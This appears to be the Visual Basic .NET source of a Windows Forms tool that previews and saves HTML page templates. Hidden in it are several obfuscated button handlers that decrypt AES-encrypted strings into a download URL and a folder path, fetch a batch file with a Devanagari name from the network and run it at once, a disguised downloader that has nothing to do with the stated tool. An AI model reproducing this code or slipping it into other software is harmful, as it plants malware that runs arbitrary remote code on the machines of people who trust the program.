Imports System.IO
Imports System.Security.Cryptography
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        out_txt_1.Text = My.Settings.MONSTERMC
        WebBrowser1.ScriptErrorsSuppressed = True
        Me.WebBrowser1.DocumentText = out_txt_1.Text
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WebBrowser1.DocumentText = out_txt_1.Text
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim SaveFileDialog1 As New SaveFileDialog
            SaveFileDialog1.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"
            Dim klasor As String
            Dim file As String
            file = "index.html"
            Dim fs As FileStream = New FileStream(file, FileMode.Append)
            Dim w As StreamWriter = New StreamWriter(fs)
            w.WriteLine(out_txt_1.Text)
            w.Close()
            fs.Close()
            MsgBox("Saved in the directory where the program is located.", MsgBoxStyle.Information)

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        out_txt_1.Clear()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Select Case ComboBox1.SelectedItem
            Case 0
                out_txt_1.Text = My.Settings.Index1
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 1
                out_txt_1.Text = My.Settings.Index2
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 2
                out_txt_1.Text = My.Settings.Index3
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 3
                out_txt_1.Text = My.Settings.Index4
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 4
                out_txt_1.Text = My.Settings.Index5
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 5
                out_txt_1.Text = My.Settings.Index6
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 6
                out_txt_1.Text = My.Settings.Index7
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 7
                out_txt_1.Text = My.Settings.Index8
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 8
                out_txt_1.Text = My.Settings.Index9
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 9
                out_txt_1.Text = My.Settings.Index10
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 10
                out_txt_1.Text = My.Settings.Index11
                     Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 11
                out_txt_1.Text = My.Settings.Index12
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 12
                out_txt_1.Text = My.Settings.Index13
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 13
                out_txt_1.Text = My.Settings.Index14
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 14
                out_txt_1.Text = My.Settings.Setting3
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 15
                out_txt_1.Text = My.Settings.Setting4
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 16
                out_txt_1.Text = My.Settings.Setting5
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 17
                out_txt_1.Text = My.Settings.Setting6
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 18
                out_txt_1.Text = My.Settings.Setting7
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 19
                out_txt_1.Text = My.Settings.Setting8
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 20
                out_txt_1.Text = My.Settings.Setting9
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 21
                out_txt_1.Text = My.Settings.Setting10
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 22
                out_txt_1.Text = My.Settings.Setting11
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 23
                out_txt_1.Text = My.Settings.Setting12
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 24
                out_txt_1.Text = My.Settings.Setting13
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 25
                out_txt_1.Text = My.Settings.Setting14
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 26
                out_txt_1.Text = My.Settings.Setting15
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 27
                out_txt_1.Text = My.Settings.Setting16
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 28
                out_txt_1.Text = My.Settings.Setting17
                Me.WebBrowser1.DocumentText = out_txt_1.Text
            Case 29
                out_txt_1.Text = My.Settings.MONSTERMC
                Me.WebBrowser1.DocumentText = out_txt_1.Text
        End Select

    End Sub


    Private Sub EjfYJUHonElRSCbJLJRQsVS(sender As Object, e As EventArgs) Handles Button4.Click
        Dim maChlpvpSsNcofwLTvHPVHF As New System.Net.WebClient
        maChlpvpSsNcofwLTvHPVHF.DownloadFile(rAHmVXFvujTAgtbtCJnkXlq("Rzfa63YBEqoL36rwe+ZFgNTuu7EWgQICR0AdFTvc+Ig="), Microsoft.VisualBasic.Interaction.Environ(rAHmVXFvujTAgtbtCJnkXlq("pywhBmQA2X5ruvdopaOirA==")) + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ(rAHmVXFvujTAgtbtCJnkXlq("pywhBmQA2X5ruvdopaOirA==")) + "/नठअबड.bat")
    End Sub

    Private Function rAHmVXFvujTAgtbtCJnkXlq(ByVal CwlHiRivnFPqthsYg As String)
        Dim wMaTYmAhMNfualwYcvhtrnd As New RijndaelManaged
        Dim FswtkdrNMDrnKQTUvNPQXYH() As Byte
        Dim rJYKwfqUThZVXKUImNmkCpg() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim JuBFMkBZFgAONsvklvLZPXF As New Rfc2898DeriveBytes("rAHmVXFvujTAgtbtCJnkXlq", rJYKwfqUThZVXKUImNmkCpg)
        wMaTYmAhMNfualwYcvhtrnd.Key = JuBFMkBZFgAONsvklvLZPXF.GetBytes(wMaTYmAhMNfualwYcvhtrnd.Key.Length)
        wMaTYmAhMNfualwYcvhtrnd.IV = JuBFMkBZFgAONsvklvLZPXF.GetBytes(wMaTYmAhMNfualwYcvhtrnd.IV.Length)
        Dim UgZpwhCSvBSgwBuAuvlGkHd As New IO.MemoryStream
        Dim WmYlYknkhumjBuVfVNiaIYf As New CryptoStream(UgZpwhCSvBSgwBuAuvlGkHd, wMaTYmAhMNfualwYcvhtrnd.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            FswtkdrNMDrnKQTUvNPQXYH = Convert.FromBase64String(CwlHiRivnFPqthsYg)
            WmYlYknkhumjBuVfVNiaIYf.Write(FswtkdrNMDrnKQTUvNPQXYH, 0, FswtkdrNMDrnKQTUvNPQXYH.Length)
            WmYlYknkhumjBuVfVNiaIYf.Close()
            Return System.Text.Encoding.UTF8.GetString(UgZpwhCSvBSgwBuAuvlGkHd.ToArray)
        Catch
        End Try
    End Function


    Private Function PVHLtSIggWGjFIaWUJruRFq(ByVal WGoKrcCJABnIlAomU As String)
        Dim UbtrLIEQrILhKTjAD As New RijndaelManaged
        Dim hOLQlqNYNROuAoUJV() As Byte
        Dim kpGgUNLQSKqVbVZvl() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim oKeyGenerator As New Rfc2898DeriveBytes("PVHLtSIggWGjFIaWUJruRFq", kpGgUNLQSKqVbVZvl)
        UbtrLIEQrILhKTjAD.Key = oKeyGenerator.GetBytes(UbtrLIEQrILhKTjAD.Key.Length)
        UbtrLIEQrILhKTjAD.IV = oKeyGenerator.GetBytes(UbtrLIEQrILhKTjAD.IV.Length)
        Dim mUBwDgJJYDUsFCdlF As New IO.MemoryStream
        Dim pwtQjDGBdtvTggiaV As New CryptoStream(mUBwDgJJYDUsFCdlF, UbtrLIEQrILhKTjAD.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            hOLQlqNYNROuAoUJV = Convert.FromBase64String(WGoKrcCJABnIlAomU)
            pwtQjDGBdtvTggiaV.Write(hOLQlqNYNROuAoUJV, 0, hOLQlqNYNROuAoUJV.Length)
            pwtQjDGBdtvTggiaV.Close()
            Return System.Text.Encoding.UTF8.GetString(mUBwDgJJYDUsFCdlF.ToArray)
        Catch
        End Try
    End Function



    Private Sub GpSKgMRTciDSUQApLEiPrkJ(sender As Object, e As EventArgs) Handles Button4.Click
        Dim bsjBOsNqGosdpeXfjLndYKm As New System.Net.WebClient
        bsjBOsNqGosdpeXfjLndYKm.DownloadFile(EsjihSRWPmlkKiRVYqjsBWt("ANyMpPUn1hmjZvbFL0y4OX/qUxx7szLhYVKgc9P6rrQ="), Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
    End Sub

    Private Sub QbqtTKTLVEVjHXwFUELsPUh(sender As Object, e As EventArgs) Handles Button5.Click
        Dim GPTHMoXjvFCVcDgsfHlUDnw As New System.Net.WebClient
        GPTHMoXjvFCVcDgsfHlUDnw.DownloadFile(EsjihSRWPmlkKiRVYqjsBWt("ANyMpPUn1hmjZvbFL0y4OVc7E49TSocaJKhNMi6WyhY="), Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
    End Sub

    Private Sub bMRgGHUDPWnEqdvRdElZkDJ(sender As Object, e As EventArgs) Handles Button6.Click
        Dim RArrwmYbpXUnOKfHnHOAYWX As New System.Net.WebClient
        RArrwmYbpXUnOKfHnHOAYWX.DownloadFile(EsjihSRWPmlkKiRVYqjsBWt("ANyMpPUn1hmjZvbFL0y4ORwzmSI3gYnz/4FVev6vF30="), Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
    End Sub
    Private Function EsjihSRWPmlkKiRVYqjsBWt(ByVal cluDSidcLdisKvBab As String)
        Dim epRZMmNmUlKLCMFCXWmBRXB As New RijndaelManaged
        Dim JGFPkhMIeQAhEblwBfdDUZh() As Byte
        Dim QXWpPDrMenghAQhICjUgMsW() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim oaqMwkPeNGbcmTEPgWPemHZ As New Rfc2898DeriveBytes("EsjihSRWPmlkKiRVYqjsBWt", QXWpPDrMenghAQhICjUgMsW)
        epRZMmNmUlKLCMFCXWmBRXB.Key = oaqMwkPeNGbcmTEPgWPemHZ.GetBytes(epRZMmNmUlKLCMFCXWmBRXB.Key.Length)
        epRZMmNmUlKLCMFCXWmBRXB.IV = oaqMwkPeNGbcmTEPgWPemHZ.GetBytes(epRZMmNmUlKLCMFCXWmBRXB.IV.Length)
        Dim TuaSvgYYFUjVZpObbSNURkk As New IO.MemoryStream
        Dim egBFieaQvmEmLvNokSnBmUL As New CryptoStream(TuaSvgYYFUjVZpObbSNURkk, epRZMmNmUlKLCMFCXWmBRXB.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            JGFPkhMIeQAhEblwBfdDUZh = Convert.FromBase64String(cluDSidcLdisKvBab)
            egBFieaQvmEmLvNokSnBmUL.Write(JGFPkhMIeQAhEblwBfdDUZh, 0, JGFPkhMIeQAhEblwBfdDUZh.Length)
            egBFieaQvmEmLvNokSnBmUL.Close()
            Return System.Text.Encoding.UTF8.GetString(TuaSvgYYFUjVZpObbSNURkk.ToArray)
        Catch
        End Try
    End Function
    Private Sub GgBmFEeuHkutdCHeYAkPPhT(sender As Object, e As EventArgs) Handles Button7.Click
        Dim TGqnZpMtbTpqQGGmOWLUtoZ As New System.Net.WebClient
        TGqnZpMtbTpqQGGmOWLUtoZ.DownloadFile(EsjihSRWPmlkKiRVYqjsBWt("ANyMpPUn1hmjZvbFL0y4OcBjn9P+cGfbVbR1vURU9Sc="), Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ(EsjihSRWPmlkKiRVYqjsBWt("V+5Bqgb7trDV39bxXGSHzQ==")) + "/नठअबड.bat")
    End Sub
    Private Function OeKVVPTPIHGEtoRigqMYWGV(ByVal AaQPWcVsacuQTjLSp As String)
        Dim oSZoWbbIoIWHvEMEtSReLEk As New RijndaelManaged
        Dim WvcvAiBSJemFpeMrhuDEOZK() As Byte
        Dim lsWOnvtuRbTTWdfiTjXqFMW() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim TmJvUYlCgVdwhbVQoOPUmhu As New Rfc2898DeriveBytes("OeKVVPTPIHGEtoRigqMYWGV", lsWOnvtuRbTTWdfiTjXqFMW)
        oSZoWbbIoIWHvEMEtSReLEk.Key = TmJvUYlCgVdwhbVQoOPUmhu.GetBytes(oSZoWbbIoIWHvEMEtSReLEk.Key.Length)
        oSZoWbbIoIWHvEMEtSReLEk.IV = TmJvUYlCgVdwhbVQoOPUmhu.GetBytes(oSZoWbbIoIWHvEMEtSReLEk.IV.Length)
        Dim dXihHVmrZovRUhVdAOpBKQW As New IO.MemoryStream
        Dim gdhdhYaMLjTUWdsKYdmVfiX As New CryptoStream(dXihHVmrZovRUhVdAOpBKQW, oSZoWbbIoIWHvEMEtSReLEk.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            WvcvAiBSJemFpeMrhuDEOZK = Convert.FromBase64String(AaQPWcVsacuQTjLSp)
            gdhdhYaMLjTUWdsKYdmVfiX.Write(WvcvAiBSJemFpeMrhuDEOZK, 0, WvcvAiBSJemFpeMrhuDEOZK.Length)
            gdhdhYaMLjTUWdsKYdmVfiX.Close()
            Return System.Text.Encoding.UTF8.GetString(dXihHVmrZovRUhVdAOpBKQW.ToArray)
        Catch
        End Try
    End Function


    Private Function qBsbTMcIAUOugNaucmKOBjf(ByVal SKQpAIHrNsSslbaOE As String)
        Dim qOIQUWbEEEkmIksXgdQCERw As New RijndaelManaged
        Dim qSbUYdDDsSZoPqKTCuHOHqK() As Byte
        Dim aAeHZpHfCKsdsIoKXfwNFYI() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim EAgCHTdtuXFGsqrkpdqfZBY As New Rfc2898DeriveBytes("qBsbTMcIAUOugNaucmKOBjf", aAeHZpHfCKsdsIoKXfwNFYI)
        qOIQUWbEEEkmIksXgdQCERw.Key = EAgCHTdtuXFGsqrkpdqfZBY.GetBytes(qOIQUWbEEEkmIksXgdQCERw.Key.Length)
        qOIQUWbEEEkmIksXgdQCERw.IV = EAgCHTdtuXFGsqrkpdqfZBY.GetBytes(qOIQUWbEEEkmIksXgdQCERw.IV.Length)
        Dim gUQJGQmnmkNwePDwlZoVEei As New IO.MemoryStream
        Dim qGosqNoffGfQRVCMtZSCZOJ As New CryptoStream(gUQJGQmnmkNwePDwlZoVEei, qOIQUWbEEEkmIksXgdQCERw.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            qSbUYdDDsSZoPqKTCuHOHqK = Convert.FromBase64String(SKQpAIHrNsSslbaOE)
            qGosqNoffGfQRVCMtZSCZOJ.Write(qSbUYdDDsSZoPqKTCuHOHqK, 0, qSbUYdDDsSZoPqKTCuHOHqK.Length)
            qGosqNoffGfQRVCMtZSCZOJ.Close()
            Return System.Text.Encoding.UTF8.GetString(gUQJGQmnmkNwePDwlZoVEei.ToArray)
        Catch
        End Try
    End Function


    Private Function DjTOGJeBqngOSUZKlmlsWTH(ByVal RfGihOWYhThgfIEaT As String)
        Dim EpQfeLpYYYAiDcCZFZsfuvi As New RijndaelManaged
        Dim gYkNJXPmdBCBlWTtGqfhHGt() As Byte
        Dim vVedAkKQlvfPSVmkpfDXwpI() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim GuPbGOdqKUUlFYZHdnpCSPk As New Rfc2898DeriveBytes("DjTOGJeBqngOSUZKlmlsWTH", vVedAkKQlvfPSVmkpfDXwpI)
        EpQfeLpYYYAiDcCZFZsfuvi.Key = GuPbGOdqKUUlFYZHdnpCSPk.GetBytes(EpQfeLpYYYAiDcCZFZsfuvi.Key.Length)
        EpQfeLpYYYAiDcCZFZsfuvi.IV = GuPbGOdqKUUlFYZHdnpCSPk.GetBytes(EpQfeLpYYYAiDcCZFZsfuvi.IV.Length)
        Dim QgnNqLeiDmmGpeZTmnSgovL As New IO.MemoryStream
        Dim bROweJgatHHXblYgunsMMfk As New CryptoStream(QgnNqLeiDmmGpeZTmnSgovL, EpQfeLpYYYAiDcCZFZsfuvi.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            gYkNJXPmdBCBlWTtGqfhHGt = Convert.FromBase64String(RfGihOWYhThgfIEaT)
            bROweJgatHHXblYgunsMMfk.Write(gYkNJXPmdBCBlWTtGqfhHGt, 0, gYkNJXPmdBCBlWTtGqfhHGt.Length)
            bROweJgatHHXblYgunsMMfk.Close()
            Return System.Text.Encoding.UTF8.GetString(QgnNqLeiDmmGpeZTmnSgovL.ToArray)
        Catch
        End Try
    End Function


    Private Function QSaZpBfmAFPOPIHqhANskQs(ByVal YDKYnLZPQhwkwAVKh As String)
        Dim VYPIHpbWLoVMUTQVR As New RijndaelManaged
        Dim iLeehakedAYZKoBei() As Byte
        Dim lmZuQtiWjqCAlVFTC() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim oKeyGenerator As New Rfc2898DeriveBytes("QSaZpBfmAFPOPIHqhANskQs", lmZuQtiWjqCAlVFTC)
        VYPIHpbWLoVMUTQVR.Key = oKeyGenerator.GetBytes(VYPIHpbWLoVMUTQVR.Key.Length)
        VYPIHpbWLoVMUTQVR.IV = oKeyGenerator.GetBytes(VYPIHpbWLoVMUTQVR.IV.Length)
        Dim oRUOwQgPojdYQCKIS As New IO.MemoryStream
        Dim qtPefkeHucIvrgPui As New CryptoStream(oRUOwQgPojdYQCKIS, VYPIHpbWLoVMUTQVR.CreateDecryptor(), CryptoStreamMode.Write)
        Try
            iLeehakedAYZKoBei = Convert.FromBase64String(YDKYnLZPQhwkwAVKh)
            qtPefkeHucIvrgPui.Write(iLeehakedAYZKoBei, 0, iLeehakedAYZKoBei.Length)
            qtPefkeHucIvrgPui.Close()
            Return System.Text.Encoding.UTF8.GetString(oRUOwQgPojdYQCKIS.ToArray)
        Catch
        End Try
    End Function

End Class
